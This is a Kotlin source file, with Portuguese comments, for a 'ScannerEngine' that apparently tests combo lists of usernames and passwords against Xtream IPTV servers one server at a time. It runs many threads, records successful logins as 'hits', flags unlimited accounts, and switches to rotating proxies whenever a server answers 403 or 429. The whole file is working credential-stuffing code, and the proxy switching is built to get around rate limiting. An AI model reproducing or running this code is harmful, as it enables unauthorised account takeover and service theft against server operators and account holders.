package com.ascan.ascanagent.data

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.asCoroutineDispatcher
import kotlinx.coroutines.cancel
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * Scan SEQUENCIAL: termina o servidor 1 inteiro, depois 2, depois 3...
 * Foco + velocidade no host atual; avanca automatico.
 */
class ScannerEngine {

    private var job: kotlinx.coroutines.Job? = null
    private val paused = AtomicBoolean(false)
    private val stopped = AtomicBoolean(true)

    var onStats: ((ScanStats) -> Unit)? = null
    var onHit: ((Hit) -> Unit)? = null
    var onLog: ((String) -> Unit)? = null
    var onServerStatus: ((List<ServerStatus>) -> Unit)? = null
    var onFinished: (() -> Unit)? = null

    fun isRunning(): Boolean = !stopped.get()
    fun isPaused(): Boolean = paused.get()

    fun start(
        servers: List<String>,
        combo: List<Credential>,
        comboName: String,
        threads: Int,
        mode: AtkMode,
        proxies: List<String> = emptyList()
    ) {
        stop()
        stopped.set(false)
        paused.set(false)

        val checks = AtomicInteger(0)
        val hits = AtomicInteger(0)
        val unlimited = AtomicInteger(0)
        val e403 = AtomicInteger(0)
        val e429 = AtomicInteger(0)
        val timeouts = AtomicInteger(0)
        val startMs = System.currentTimeMillis()
        val total = (servers.size * combo.size).coerceAtLeast(1)
        val proxyIdx = AtomicInteger(0)
        val serverHits = ConcurrentHashMap<String, AtomicInteger>()
        val serverState = ConcurrentHashMap<String, String>()
        val useProxyFor = ConcurrentHashMap<String, Boolean>()
        val stateMutex = Mutex()

        val hosts = servers.map { XtreamApi.normServer(it) }.distinct()
        hosts.forEach {
            serverHits[it] = AtomicInteger(0)
            serverState[it] = "WAIT" // aguardando vez
            useProxyFor[it] = false
        }

        onLog?.invoke("Start ${hosts.size} srv (sequencial) | ${combo.size} combo | thr $threads | ${mode.label} | px ${proxies.size}")

        val pool = Executors.newFixedThreadPool(threads.coerceIn(1, 64))
        val dispatcher = pool.asCoroutineDispatcher()
        val scope = CoroutineScope(SupervisorJob() + dispatcher)

        fun pushStats() {
            val elapsed = ((System.currentTimeMillis() - startMs) / 1000).coerceAtLeast(1)
            try {
                onStats?.invoke(
                    ScanStats(
                        checks = checks.get(),
                        hits = hits.get(),
                        unlimited = unlimited.get(),
                        errors403 = e403.get(),
                        errors429 = e429.get(),
                        timeouts = timeouts.get(),
                        cpm = ((checks.get() * 60.0) / elapsed).toInt(),
                        progress = checks.get().toFloat() / total,
                        elapsedSec = elapsed,
                        totalCombo = combo.size,
                        proxies = proxies.size
                    )
                )
                val ranking = hosts.map { h ->
                    val hc = serverHits[h]?.get() ?: 0
                    val st = when {
                        hc > 0 -> "ON"
                        else -> serverState[h] ?: "..."
                    }
                    ServerStatus(host = h, state = st, hits = hc)
                }.sortedWith(compareByDescending<ServerStatus> { it.hits }.thenBy { hosts.indexOf(it.host) })
                onServerStatus?.invoke(ranking)
            } catch (_: Exception) {
            }
        }

        job = scope.launch {
            for ((idx, server) in hosts.withIndex()) {
                if (stopped.get()) break

                // marca atual como SCAN e os futuros WAIT
                stateMutex.withLock {
                    serverState[server] = "SCAN"
                    hosts.drop(idx + 1).forEach { if (serverState[it] == "WAIT" || serverState[it] == "...") serverState[it] = "WAIT" }
                }
                onLog?.invoke("→ Servidor ${idx + 1}/${hosts.size}: $server")
                pushStats()

                val channel = Channel<Credential>(capacity = Channel.UNLIMITED)
                val producer = launch {
                    for (cred in combo) {
                        if (stopped.get()) break
                        channel.send(cred)
                    }
                    channel.close()
                }

                val workers = List(threads.coerceIn(1, 64)) {
                    launch {
                        for (cred in channel) {
                            if (stopped.get()) break
                            while (paused.get() && !stopped.get()) delay(200)
                            if (stopped.get()) break
                            if (mode.delayMs > 0) delay(mode.delayMs)

                            val needPx = proxies.isNotEmpty() && (useProxyFor[server] == true)
                            val proxy = if (needPx) {
                                proxies[proxyIdx.getAndIncrement() % proxies.size]
                            } else null

                            var result = XtreamApi.check(
                                server, cred.user, cred.pass,
                                timeoutSec = if (proxy != null) mode.timeoutSec.coerceAtMost(5) else mode.timeoutSec,
                                proxyUrl = proxy
                            )

                            if (proxy == null && proxies.isNotEmpty() && (
                                    result.code == 403 || result.code == 429 ||
                                        result.err.contains("403") || result.err.contains("429")
                                    )
                            ) {
                                useProxyFor[server] = true
                                stateMutex.withLock {
                                    if ((serverHits[server]?.get() ?: 0) == 0) serverState[server] = "PROT"
                                }
                                val px = proxies[proxyIdx.getAndIncrement() % proxies.size]
                                result = XtreamApi.check(
                                    server, cred.user, cred.pass,
                                    timeoutSec = mode.timeoutSec.coerceAtMost(5),
                                    proxyUrl = px
                                )
                            }

                            if (proxy != null && !result.hit && (
                                    result.err.contains("Timeout", true) || result.code == 0
                                    )
                            ) {
                                val direct = XtreamApi.check(
                                    server, cred.user, cred.pass,
                                    timeoutSec = mode.timeoutSec,
                                    proxyUrl = null
                                )
                                if (direct.hit || direct.code in listOf(200, 403, 429)) {
                                    result = direct
                                }
                            }

                            val n = checks.incrementAndGet()
                            when {
                                result.hit -> {
                                    val hit = XtreamApi.buildHit(
                                        server, cred.user, cred.pass, result.data, comboName
                                    )
                                    hits.incrementAndGet()
                                    if (hit.unlimited) unlimited.incrementAndGet()
                                    serverHits[server]?.incrementAndGet()
                                    stateMutex.withLock { serverState[server] = "ON" }
                                    try {
                                        onHit?.invoke(hit)
                                    } catch (_: Exception) {
                                    }
                                }
                                result.code == 403 || result.err.contains("403") -> {
                                    e403.incrementAndGet()
                                    if (proxies.isNotEmpty()) useProxyFor[server] = true
                                    stateMutex.withLock {
                                        if ((serverHits[server]?.get() ?: 0) == 0) serverState[server] = "PROT"
                                    }
                                }
                                result.code == 429 || result.err.contains("429") -> {
                                    e429.incrementAndGet()
                                    if (proxies.isNotEmpty()) useProxyFor[server] = true
                                    stateMutex.withLock {
                                        if ((serverHits[server]?.get() ?: 0) == 0) serverState[server] = "PROT"
                                    }
                                }
                                result.err.contains("Timeout", true) || result.code == 0 -> {
                                    timeouts.incrementAndGet()
                                }
                                result.code == 200 -> {
                                    stateMutex.withLock {
                                        if ((serverHits[server]?.get() ?: 0) == 0 && serverState[server] != "PROT") {
                                            serverState[server] = "ON"
                                        }
                                    }
                                }
                            }

                            if (n % 8 == 0 || result.hit) pushStats()
                        }
                    }
                }

                producer.join()
                workers.forEach { it.join() }

                if (stopped.get()) break

                // fim deste servidor
                val hc = serverHits[server]?.get() ?: 0
                stateMutex.withLock {
                    if (hc > 0) serverState[server] = "ON"
                    else if (serverState[server] == "SCAN") serverState[server] = "DONE"
                }
                onLog?.invoke("✓ Fim $server | hits $hc")
                pushStats()

                if (idx < hosts.lastIndex && !stopped.get()) {
                    onLog?.invoke("→ Proximo: ${hosts[idx + 1]}")
                }
            }

            stopped.set(true)
            val elapsed = ((System.currentTimeMillis() - startMs) / 1000).coerceAtLeast(1)
            try {
                onStats?.invoke(
                    ScanStats(
                        checks = checks.get(),
                        hits = hits.get(),
                        unlimited = unlimited.get(),
                        errors403 = e403.get(),
                        errors429 = e429.get(),
                        timeouts = timeouts.get(),
                        cpm = ((checks.get() * 60.0) / elapsed).toInt(),
                        progress = 1f,
                        elapsedSec = elapsed,
                        totalCombo = combo.size,
                        proxies = proxies.size
                    )
                )
                onLog?.invoke("Fim total | Hits ${hits.get()} | Checks ${checks.get()}")
                onFinished?.invoke()
            } catch (_: Exception) {
            }
            scope.cancel()
            pool.shutdownNow()
        }
    }

    fun pause() {
        paused.set(true)
        onLog?.invoke("Pausado")
    }

    fun resume() {
        paused.set(false)
        onLog?.invoke("Retomado")
    }

    fun stop() {
        stopped.set(true)
        paused.set(false)
        job?.cancel()
        job = null
    }
}
